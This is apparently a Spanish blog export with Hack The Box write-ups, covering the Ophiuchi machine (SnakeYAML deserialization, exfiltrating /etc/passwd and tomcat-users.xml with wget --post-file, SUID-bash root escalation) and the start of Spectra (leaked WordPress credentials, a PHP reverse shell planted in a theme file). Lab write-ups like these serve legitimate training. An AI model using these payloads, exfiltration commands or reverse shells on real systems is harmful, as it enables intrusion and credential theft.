Unauthorized\u0026lt;/h1\u0026gt;   Además logramos obtener la version realizando una solicitud a una direccion falsa.\n1 2 3  ┌──(kali㉿kali)-[~/htb/ophiuchi] └─$ curl -s http://10.10.10.227:8080/batman |html2text|grep \u0026#34;Tomcat\u0026#34; **** Apache Tomcat/9.0.38 ****   SNAKEYAML DESERIALIZATION Volviendo a la pagina inicial, realizamos una busqueda de vulnerabilidades relacionadas a YAML en lenguaje Java. Encontramos una vulnerabilidad relacionada a la libreria snakeyaml en donde obtiene un payload el cual carga codigo para realizar una solicitud a la direccion dada, mediante ScriptEngineManager, en esta solicitud espera que el archivo o clase (.class) javax.script.ScriptEngineFactory exista en la direccion dada, dicha clase es cargada y ejecutada.\nUtilizando un PoC que encontramos en Github modificamos AwesomeScriptEngineFactory.java en donde agregamos el comando ping hacia nuestra maquina.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  package sckull; import javax.script.ScriptEngine; import javax.script.ScriptEngineFactory; import java.io.IOException; import java.util.List; public class AwesomeScriptEngineFactory implements ScriptEngineFactory { public AwesomeScriptEngineFactory() { try { Runtime.getRuntime().exec(\u0026#34; ping -c 1 10.10.14.17 \u0026#34;); } catch (IOException e) { e.printStackTrace(); } } [... REDACTED ...] }   Compilamos el codigo, además creamos un pequeño servidor de python en la carpeta src del repositorio, enviamos nuestro payload con nuestra direccion IP.\n1 2  javac src/sckull/AwesomeScriptEngineFactory.java \u0026amp;\u0026amp; jar -cvf yaml-payload.jar -C src/ . # python3 -m http.server 80   1 2 3 4 5  !!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL [\u0026#34;http://10.10.14.17/\u0026#34;] ]] ]   Logramos obtener una solicitud utilizando tcpdump.\n1 2 3 4 5 6  ┌──(kali㉿kali)-[~/htb/ophiuchi/yaml-payload] └─$ sudo tcpdump -i tun0 icmp tcpdump: verbose output suppressed, use -v[v]... for full protocol decode listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes 02:37:56.412303 IP 10.10.10.227 \u0026gt; 10.10.14.17: ICMP echo request, id 3, seq 1, length 64 02:37:56.412310 IP 10.10.14.17 \u0026gt; 10.10.10.227: ICMP echo reply, id 3, seq 1, length 64   Intentamos ejecutar diferentes comandos para shell inversa pero ninguno funció. Utilizamos wget para enumerar la maquina con diferentes archivos del sistem,a incialmente con /etc/passwd.\n1  Runtime.getRuntime().exec(\u0026#34;wget --post-file /etc/passwd http://10.10.14.17:1338/\u0026#34;);   Con netcat a la escucha logramos obtener el archivo /etc/passwd, donde observamos algo interesante, el usuario tomcat tiene su directorio principal en /opt/tomcat.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45  ┌──(kali㉿kali)-[~/htb/ophiuchi] └─$ nc -l -p 1338 POST / HTTP/1.1 User-Agent: Wget/1.20.3 (linux-gnu) Accept: */* Accept-Encoding: identity Host: 10.10.14.17:1338 Connection: Keep-Alive Content-Type: application/x-www-form-urlencoded Content-Length: 1798 root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false sshd:x:111:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false tomcat:x:1001:1001::/opt/tomcat:/bin/false admin:x:1000:1000:,,,:/home/admin:/bin/bash   TOMCAT-USERS Sabiendo esto probablemente el directorio de instalacion de Apache Tomcat esté en /opt/tomcat y al igual que la maquina TABBY - HTB podriamos obtener el archivo tomcat-users.xml donde se encuentran las credenciales de acceso al panel de tomcat. Descargamos la misma version v9.0.38 de Tomcat para verificar el directorio donde se encuentra el archivo. El archivo lo encontramos en conf/, realizamos la solicitud de este archivo el cual logramos encontrar en /opt/tomcat/conf/tomcat-users.xml.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31  ┌──(kali㉿kali)-[~/htb/ophiuchi] └─$ nc -l -p 1338 POST / HTTP/1.1 User-Agent: Wget/1.20.3 (linux-gnu) Accept: */* Accept-Encoding: identity Host: 10.10.14.17:1338 Connection: Keep-Alive Content-Type: application/x-www-form-urlencoded Content-Length: 2234 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; [... REDACTED ...] \u0026lt;tomcat-users xmlns=\u0026#34;http://tomcat.apache.org/xml\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34;http://tomcat.apache.org/xml tomcat-users.xsd\u0026#34; version=\u0026#34;1.0\u0026#34;\u0026gt; \u0026lt;user username=\u0026#34;admin\u0026#34; password=\u0026#34;whythereisalimit\u0026#34; roles=\u0026#34;manager-gui,admin-gui\u0026#34;/\u0026gt; [... REDACTED ...] \u0026lt;!-- \u0026lt;role rolename=\u0026#34;tomcat\u0026#34;/\u0026gt; \u0026lt;role rolename=\u0026#34;role1\u0026#34;/\u0026gt; \u0026lt;user username=\u0026#34;tomcat\u0026#34; password=\u0026#34;\u0026lt;must-be-changed\u0026gt;\u0026#34; roles=\u0026#34;tomcat\u0026#34;/\u0026gt; \u0026lt;user username=\u0026#34;both\u0026#34; password=\u0026#34;\u0026lt;must-be-changed\u0026gt;\u0026#34; roles=\u0026#34;tomcat,role1\u0026#34;/\u0026gt; \u0026lt;user username=\u0026#34;role1\u0026#34; password=\u0026#34;\u0026lt;must-be-changed\u0026gt;\u0026#34; roles=\u0026#34;role1\u0026#34;/\u0026gt; --\u0026gt; \u0026lt;/tomcat-users\u0026gt;   ADMIN - USER Utilizamos las credenciales para obtener acceso al panel de tomcat, aunque, utilizando estas en el servicio SSH logramos obtener una shell y nuestra flag user.txt .\n1 2 3 4 5 6 7 8 9 10 11  ┌──(kali㉿kali)-[~/htb/ophiuchi] └─$ ssh admin@10.10.10.227 # whythereisalimit admin@10.10.10.227\u0026#39;s password: [... REDACTED ...] admin@ophiuchi:~$ whoami;id;pwd admin uid=1000(admin) gid=1000(admin) groups=1000(admin) /home/admin admin@ophiuchi:~$ cat user.txt | cut -c1-15 71c0901a2150cf8 admin@ophiuchi:~$   PRIVILEGE ESCALATION Hacemos una pequeña enumeracion con sudo -l -l y vemos que tenemos permisos sudo (root) para ejecutar el comando /usr/bin/go run /opt/wasm-functions/index.go.\nRevisamos el codigo fuente de index.go, vemos que realiza la lectura de un archivo wasm utilizando la libreria wasmer, crea una nueva instancia y exporta la funcion info la cual ejecuta, finalmente verifica que el string de esta funcion ejecutada sea valor 1, si esto no se cumple imprime el mensaje Not ready to deploy, en caso contrario realiza la ejecucion de un script llamado deploy.sh.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  package main import ( \u0026#34;fmt\u0026#34; wasm \u0026#34;github.com/wasmerio/wasmer-go/wasmer\u0026#34; \u0026#34;os/exec\u0026#34; \u0026#34;log\u0026#34; ) func main() { bytes, _ := wasm.ReadBytes(\u0026#34;main.wasm\u0026#34;) instance, _ := wasm.NewInstance(bytes) defer instance.Close() init := instance.Exports[\u0026#34;info\u0026#34;] result,_ := init() f := result.String() if (f != \u0026#34;1\u0026#34;) { fmt.Println(\u0026#34;Not ready to deploy\u0026#34;) } else { fmt.Println(\u0026#34;Ready to deploy\u0026#34;) out, err := exec.Command(\u0026#34;/bin/sh\u0026#34;, \u0026#34;deploy.sh\u0026#34;).Output() if err != nil { log.Fatal(err) } fmt.Println(string(out)) } }   Dentro de la carpeta /opt/wasm-functions/ encontramos los archivos utilizados en index.go.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  admin@ophiuchi:~$ ls -lah /opt/wasm-functions/ total 3.9M drwxr-xr-x 3 root root 4.0K Oct 14 19:52 . drwxr-xr-x 5 root root 4.0K Oct 14 09:56 .. drwxr-xr-x 2 root root 4.0K Oct 14 19:52 backup -rw-r--r-- 1 root root 88 Oct 14 19:49 deploy.sh -rwxr-xr-x 1 root root 2.5M Oct 14 19:52 index -rw-rw-r-- 1 root root 522 Oct 14 19:48 index.go -rwxrwxr-x 1 root root 1.5M Oct 14 19:41 main.wasm admin@ophiuchi:~$ cat deploy.sh #!/bin/bash # ToDo # Create script to automatic deploy our new web at tomcat port 8080 admin@ophiuchi:~$   Si bien existen estos dos archivos (main.wasm, deploy.sh), en el codigo fuente no especifica la direccion completa de ambos, por lo que podriamos ejecutar index.go en cualquier carpeta y utilizar nuestro archivo main.wasm para provocar la ejecucion del script deploy.sh.\nWASM.MAIN Creamos un archivo wasm el cual contiene la funcion info y el resultado cuando es ejecutado es: 1, basandonos de un ejemplo de wasmer en rust, utilizando la plataforma webassembly en un proyecto vacio de RUST.\nDentro de main.js modificamos la funcion, para verificar el resultado.\nModificamos el archivo main.rs donde agregamos la funcion, compilamos y ejecutamos.\nVemos en la parte inferior derecha que el resultado es 1 cuando la funcion es llamada en main.js, además se creó el archivo main.wasm el cual descargamos.\nADMIN - WASM \u0026gt; ROOT Descargamos el archivo main.wasm en la maquina, creamos el script deploy.sh con un pequeña ejecucion de comando en la carpeta /dev/shm. Vemos que nuestro script es ejecutado como root.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  admin@ophiuchi:/dev/shm$ touch deploy.sh admin@ophiuchi:/dev/shm$ vim deploy.sh admin@ophiuchi:/dev/shm$ cat deploy.sh echo \u0026#34;Hello I\u0026#39;m $(whoami)\u0026#34; \u0026gt; /dev/shm/whoami.txt admin@ophiuchi:/dev/shm$ ls deploy.sh main.wasm admin@ophiuchi:/dev/shm$ sudo /usr/bin/go run /opt/wasm-functions/index.go Ready to deploy admin@ophiuchi:/dev/shm$ ls deploy.sh main.wasm whoami.txt admin@ophiuchi:/dev/shm$ cat whoami.txt Hello I\u0026#39;m root admin@ophiuchi:/dev/shm$   Modificamos el script para darle permisos SUID a /bin/bash para obtener una shell como root y nuestra flag root.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  admin@ophiuchi:/dev/shm$ ls -lah /bin/bash -rwxr-xr-x 1 root root 1.2M Feb 25 2020 /bin/bash admin@ophiuchi:/dev/shm$ vim deploy.sh admin@ophiuchi:/dev/shm$ cat deploy.sh #echo \u0026#34;Hello I\u0026#39;m $(whoami)\u0026#34; \u0026gt; /dev/shm/whoami.txt chmod u+s /bin/bash admin@ophiuchi:/dev/shm$ sudo /usr/bin/go run /opt/wasm-functions/index.go Ready to deploy admin@ophiuchi:/dev/shm$ ls -lah /bin/bash -rwsr-xr-x 1 root root 1.2M Feb 25 2020 /bin/bash admin@ophiuchi:/dev/shm$ bash -p bash-5.0# bash-5.0# cd /root/ bash-5.0# ls go root.txt snap bash-5.0# cat root.txt | cut -c1-15 f86528dc1a751a5 bash-5.0#   YAML TOMCAT Verificamos el codigo fuente de la aplicacion web desplegada en tomcat y vemos que la informacion enviada a /Servlet es cargada con la libreria snakeyaml, donde vemos tambien el codigo vulnerable.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  import java.io.IOException; import javax.servlet.ServletException; import javax.servlet.annotation.WebServlet; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import org.yaml.snakeyaml.Yaml; @WebServlet(name = \u0026#34;Servlet\u0026#34;) public class Servlet extends HttpServlet { protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { String f = request.getParameter(\u0026#34;data\u0026#34;); Yaml yaml = new Yaml(); Object obj = yaml.load(f); //Vulnerable  response.getWriter().append(\u0026#34;Due to security reason this feature has been temporarily on hold. We will soon fix the issue!\u0026#34;); } protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {} }   ","description":"Ophiuchi presenta una vulnerabilidad de deserializacion en java en YAML con la cual se obtuvieron credenciales de tomcat y acceso a la maquina. Mediante el analisis de un archivo en Go se creó un archivo WebAssembly para ejecutar un script en bash el cual proporciona permisos sobre bash para finalmente obtener acceso como root.","id":3,"section":"posts","tags":["yaml","deserialization","java","go","wasm","webassembly","sudo privesc","suid"],"title":"Hack The Box - Ophiuchi","uri":"https://sckull.github.io/posts/ophiuchi/"},{"content":"  Spectra es una maquina con sistema ChromeOS. Obtuvimos acceso con privilegios limitados mediante las credenciales y enumeracion en Wordpress. Con credenciales de autologin obtuvimos acceso a otro usuario mediante SSH. Finalmente obtuvimos acceso privilegiado mediante una herramienta de control de servicios y modificacion de un archivo de JavaScript.\n   Nombre Spectra      OS Other   Puntos 20   Dificultad Facil   IP 10.10.10.229   Maker egre55    Matrix   { \u0026quot;type\u0026quot;:\u0026quot;radar\u0026quot;, \u0026quot;data\u0026quot;:{ \u0026quot;labels\u0026quot;:[\u0026quot;Enumeration\u0026quot;,\u0026quot;Real-Life\u0026quot;,\u0026quot;CVE\u0026quot;,\u0026quot;Custom Explotation\u0026quot;,\u0026quot;CTF-Like\u0026quot;], \u0026quot;datasets\u0026quot;:[ { \u0026quot;label\u0026quot;:\u0026quot;User Rate\u0026quot;, \u0026quot;data\u0026quot;:[5.9, 4.4, 4.6, 5.4, 5.6], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(75, 162, 189,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#4ba2bd\u0026quot; }, { \u0026quot;label\u0026quot;:\u0026quot;Maker Rate\u0026quot;, \u0026quot;data\u0026quot;:[3, 5, 5, 5, 5], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(154, 204, 20,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#9acc14\u0026quot; } ] }, \u0026quot;options\u0026quot;: {\u0026quot;scale\u0026quot;: {\u0026quot;ticks\u0026quot;: {\u0026quot;backdropColor\u0026quot;:\u0026quot;rgba(0,0,0,0)\u0026quot;}, \u0026quot;angleLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;}, \u0026quot;gridLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;} } } }     NMAP Escaneo de puertos con nmap nos muestra el puerto http (80) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  # Nmap 7.91 scan initiated Sat Feb 27 23:33:01 2021 as: nmap -p- --min-rate 10000 -oN allports 10.129.81.209 Warning: 10.129.81.209 giving up on port because retransmission cap hit (10). Nmap scan report for 10.129.81.209 (10.129.81.209) Host is up (0.088s latency). Not shown: 33267 filtered ports, 32266 closed ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http # Nmap done at Sat Feb 27 23:34:48 2021 -- 1 IP address (1 host up) scanned in 107.46 seconds # Nmap 7.91 scan initiated Sat Feb 27 23:36:14 2021 as: nmap -p 22,80 -sV -sC -oN serviceports 10.129.81.209 Nmap scan report for spectra.htb (10.129.81.209) Host is up (0.14s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.1 (protocol 2.0) | ssh-hostkey: |_ 4096 52:47:de:5c:37:4f:29:0e:8e:1d:88:6e:f9:23:4d:5a (RSA) 80/tcp open http nginx 1.17.4 |_http-server-header: nginx/1.17.4 |_http-title: Site doesn\u0026#39;t have a title (text/html). Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Feb 27 23:36:30 2021 -- 1 IP address (1 host up) scanned in 15.36 seconds   HTTP Encontramos una pagina web en la que se muestran dos enlaces hacia un dominio (spectra.htb).\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos, pero solo encontramos las direcciones de los enlaces en la pagina.\n1 2 3 4 5  ┌──(kali㉿kali)-[~] └─$ gobuster dir -u http://spectra.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,xml -t 100 -q /index.html (Status: 200) /main (Status: 301) /testing (Status: 301)   WORDPRESS Agregamos el dominio al archivo /etc/hosts con la direccion IP de la maquina, en el primer enlace (/main) se muestra una pagina de wordpress.\nEn el segundo (/testing), un error de conexion. Pero en este ultimo al eliminar index.php nos muestra una lista de archivos los cuales pertenecen a wordpress.\nEn la lista de archivos vemos wp-config.php.save el cual contiene el codigo fuente de lo que parece ser wp-config.php. En este archivo encontramos las credenciales e informacion de la base de datos utilizada por wordpress, pero, no tenemos acceso al servicio de la base de datos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36  ┌──(kali㉿kali)-[~/htb/spectra] └─$ curl -s http://spectra.htb/testing/wp-config.php.save| grep -v \u0026#39;*\u0026#39; \u0026lt;?php define( \u0026#39;DB_NAME\u0026#39;, \u0026#39;dev\u0026#39; ); define( \u0026#39;DB_USER\u0026#39;, \u0026#39;devtest\u0026#39; ); define( \u0026#39;DB_PASSWORD\u0026#39;, \u0026#39;devteam01\u0026#39; ); define( \u0026#39;DB_HOST\u0026#39;, \u0026#39;localhost\u0026#39; ); define( \u0026#39;DB_CHARSET\u0026#39;, \u0026#39;utf8\u0026#39; ); define( \u0026#39;DB_COLLATE\u0026#39;, \u0026#39;\u0026#39; ); define( \u0026#39;AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); $table_prefix = \u0026#39;wp_\u0026#39;; define( \u0026#39;WP_DEBUG\u0026#39;, false ); if ( ! defined( \u0026#39;ABSPATH\u0026#39; ) ) { define( \u0026#39;ABSPATH\u0026#39;, __DIR__ . \u0026#39;/\u0026#39; ); } require_once ABSPATH . \u0026#39;wp-settings.php\u0026#39;;   WPSCAN Intentamos utilizar la contraseña y usuario en la pagina de administracion de wordpress (/main) pero no funcionó. Enumeramos los usuarios utilizando WPSCAN.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52  ┌──(kali㉿kali)-[~/htb/spectra] └─$ wpscan --url http://spectra.htb/main/ -e u --no-banner 1 ⨯ [+] URL: http://spectra.htb/main/ [10.129.82.67] [+] Started: Sun Feb 28 18:55:50 2021 Interesting Finding(s): [+] Headers | Interesting Entries: | - Server: nginx/1.17.4 | - X-Powered-By: PHP/5.6.40 | Found By: Headers (Passive Detection) | Confidence: 100% [... REDACTED ...] [+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10). | Found By: Rss Generator (Passive Detection) | - http://spectra.htb/main/?feed=rss2, \u0026lt;generator\u0026gt;https://wordpress.org/?v=5.4.2\u0026lt;/generator\u0026gt; | - http://spectra.htb/main/?feed=comments-rss2, \u0026lt;generator\u0026gt;https://wordpress.org/?v=5.4.2\u0026lt;/generator\u0026gt; [+] WordPress theme in use: twentytwenty | Location: http://spectra.htb/main/wp-content/themes/twentytwenty/ | Last Updated: 2020-12-09T00:00:00.000Z | Readme: http://spectra.htb/main/wp-content/themes/twentytwenty/readme.txt | [!] The version is out of date, the latest version is 1.6 | Style URL: http://spectra.htb/main/wp-content/themes/twentytwenty/style.css?ver=1.2 | Style Name: Twenty Twenty | Style URI: https://wordpress.org/themes/twentytwenty/ | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor... | Author: the WordPress team | Author URI: https://wordpress.org/ | | Found By: Css Style In Homepage (Passive Detection) | | Version: 1.2 (80% confidence) | Found By: Style (Passive Detection) | - http://spectra.htb/main/wp-content/themes/twentytwenty/style.css?ver=1.2, Match: \u0026#39;Version: 1.2\u0026#39; [+] Enumerating Users (via Passive and Aggressive Methods) Brute Forcing Author IDs - Time: 00:00:01 \u0026lt;===============================================================================================================================================================\u0026gt; (10 / 10) 100.00% Time: 00:00:01 [i] User(s) Identified: [+] administrator | Found By: Author Posts - Display Name (Passive Detection) | Confirmed By: | Rss Generator (Passive Detection) | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection) [... REDACTED ...]   NGINX - USER Encontramos el usuario administrator, utilizamos este usuario con la contraseña que encontramos en el codigo fuente en el panel de administracion de wordpress donde logramos obtener acceso, aunque la pagina no esta muy bien esteticamente ya que no encuentra las hojas de estilo.\nUtilizamos el editor de Temas para agregar una shell inversa de PHP en el archivo 404.php. Para ejecutar nuestra shell inversa, \u0026ldquo;generamos\u0026rdquo; un error al visitar un post que no existe (http://spectra.htb/main/?p=1338), con lo cual logramos obtener una shell con el usuario nginx.\n En el caso de que wordpress no permita guardar los cambios en el archivo php, es necesario cambiar de tema, y luego de guardar los cambios, regresar al tema que contiene los cambios realizados\n 1 2  $sock=fsockopen(\u0026#34;10.0.0.1\u0026#34;,4242); $proc=proc_open(\u0026#34;/bin/sh -i\u0026#34;, array(0=\u0026gt;$sock, 1=\u0026gt;$sock, 2=\u0026gt;$sock),$pipes);   KATIE - USER Realizamos una enumeracion en la maquina, encontramos la flag user.txt pero no tenemos permisos, por lo que debemos de obtener acceso con el usuario katie dentro de la maquina. Además encontramos que es el sistema operativo es ChromeOS en su version 87.3.41\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49  nginx@spectra /home $ find . -name user.txt 2\u0026gt;/dev/null find . -name user.txt 2\u0026gt;/dev/null ./katie/user.txt cd katie cd katie ls -lah ls -lah total 36K drwxr-xr-x 5 katie katie 4.0K Feb 2 15:57 . drwxr-xr-x 8 root root 4.0K Feb 2 15:55 .. lrwxrwxrwx 1 root root 9 Feb 2 15:55 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 katie katie 127 Dec 22 05:46 .bash_logout -rw-r--r-- 1 katie katie 204 Dec 22 05:46 .bash_profile -rw-r--r-- 1 katie katie 551 Dec 22 05:46 .bashrc drwx------ 3 katie katie 4.0K Jan 15 15:55 .pki drwx------ 2 katie katie 4.0K Feb 10 06:10 .ssh drwxr-xr-x 2 katie katie 4.0K Jan 15 15:55 log -r-------- 1 katie katie 33 Feb 2 15:57 user.txt cat user.txt cat user.txt cat: user.txt: Permission denied cat /etc/*-release cat /etc/*-release BUILD_NUMBER=22 CHROMEOVER_BUILD_COMMIT=829e617e7b8467c355f9bd61f87835bfeb0da547 CHROMIUMOS_MANIFEST_COMMIT=38c4f6ca60a47f7fabf0fcd5d6feabf349e3f002 CHROMIUM_BROWSER_COMMIT=ef24d0b3349c2324d18a3f32bc35d14e796aeddc PIPELINE_TAG=prod USE_FLAGS=-cros-debug beerover virtualbox GOOGLE_RELEASE=87.3.41 CHROMEOS_RELEASE_BRANCH_NUMBER=85 CHROMEOS_RELEASE_TRACK=stable-channel CHROMEOS_RELEASE_KEYSET=devkeys CHROMEOS_RELEASE_NAME=Chromium OS CHROMEOS_AUSERVER=https://cloudready-free-update-server-2.neverware.com/update CHROMEOS_RELEASE_BOARD=chromeover64 CHROMEOS_DEVSERVER=https://cloudready-free-update-server-2.neverware.com/ CHROMEOS_RELEASE_BUILD_NUMBER=13505 CHROMEOS_CANARY_APPID={90F229CE-83E2-4FAF-8479-E368A34938B1} CHROMEOS_RELEASE_CHROME_MILESTONE=87 CHROMEOS_RELEASE_PATCH_NUMBER=2021_01_15_2352 CHROMEOS_RELEASE_APPID=87efface-864d-49a5-9bb3-4b050a7c227a CHROMEOS_BOARD_APPID=87efface-864d-49a5-9bb3-4b050a7c227a CHROMEOS_RELEASE_BUILD_TYPE=Developer Build - neverware CHROMEOS_RELEASE_VERSION=87.3.41 CHROMEOS_RELEASE_DESCRIPTION=87.3.41 (Developer Build - neverware) stable-channel chromeover64 nginx@spectra /home/katie $ nginx@spectra /home/katie $   Tambien encontramos dentro del directorio /opt un archivo de configuracion que tal parece realiza la lectura de la contraseña que se encuentra en /etc/autologin/passwd y la pasa al script inject-keys.py.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  cat autologin.conf.orig # Copyright 2016 The Chromium OS Authors. All rights reserved. # Use of this source code is governed by a BSD-style license that can be # found in the LICENSE file. description \u0026#34;Automatic login at boot\u0026#34; author \u0026#34;chromium-os-dev@chromium.org\u0026#34; # After boot-complete starts, the login prompt is visible and is accepting # input. start on started boot-complete script passwd= # Read password from file. The file may optionally end with a newline. for dir in /mnt/stateful_partition/etc/autologin /etc/autologin; do if [ -e \u0026#34;${dir}/passwd\u0026#34; ]; then passwd=\u0026#34;$(cat \u0026#34;${dir}/passwd\u0026#34;)\u0026#34; break fi done if [ -z \u0026#34;${passwd}\u0026#34; ]; then exit 0 fi # Inject keys into the login prompt. # # For this to work, you must have already created an account on the device. # Otherwise, no login prompt appears at boot and the injected keys do the # wrong thing. /usr/local/sbin/inject-keys.py -s \u0026#34;${passwd}\u0026#34; -k enter   En el archivo /etc/autologin/passwd encontramos una contraseña, la cual utilizamos para obtener una shell con la usuario katie a travez del servicio SSH.\n1 2 3  nginx@spectra /opt $ cat /etc/autologin/passwd SummerHereWeCome!! nginx@spectra /opt $   PRIVILEGE ESCALATION Hacemos una pequeña enumeracion con sudo -l -l y vemos que tenemos permisos sudo (root) para ejecutar el comando /sbin/initctl.\n1 2 3 4 5 6 7 8 9  katie@spectra ~ $ sudo -l -l User katie may run the following commands on spectra: Sudoers entry: RunAsUsers: ALL Options: setenv, !authenticate Commands: /sbin/initctl katie@spectra ~ $   initctl permite interactuar y administrar servicios, y con este comando es posible leer el archivo de configuracion de cada servicio. Intentamos crear un archivo de configuracion para un servicio nuevo pero no tenemos permisos.\n1 2  katie@spectra ~ $ touch /etc/init/config.conf touch: cannot touch \u0026#39;/etc/init/config.conf\u0026#39;: Permission denied   Al revisar los archivos de configuracion de los servicios encontramos que algunos pertenecen al grupo developers del cual katie pertenece. Además listamos los servicios pero ninguno de estos está corriendo.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30  katie@spectra ~ $ ls -lah /etc/init | sort|grep developers -rw-rw---- 1 root developers 478 Jun 29 2020 test.conf -rw-rw---- 1 root developers 478 Jun 29 2020 test1.conf -rw-rw---- 1 root developers 478 Jun 29 2020 test10.conf -rw-rw---- 1 root developers 478 Jun 29 2020 test2.conf -rw-rw---- 1 root developers 478 Jun 29 2020 test3.conf -rw-rw---- 1 root developers 478 Jun 29 2020 test4.conf -rw-rw---- 1 root developers 478 Jun 29 2020 test5.conf -rw-rw---- 1 root developers 478 Jun 29 2020 test6.conf -rw-rw---- 1 root developers 478 Jun 29 2020 test7.conf -rw-rw---- 1 root developers 478 Jun 29 2020 test8.conf -rw-rw---- 1 root developers 478 Jun 29 2020 test9.conf katie@spectra ~ $ id uid=20156(katie) gid=20157(katie) groups=20157(katie),20158(developers) katie@spectra ~ $ katie@spectra ~ $ /sbin/initctl list|grep test test stop/waiting test1 stop/waiting test7 stop/waiting test6 stop/waiting test5 stop/waiting test4 stop/waiting test10 stop/waiting attestationd start/running, process 1687 trace_marker-test stop/waiting test9 stop/waiting test8 stop/waiting test3 stop/waiting 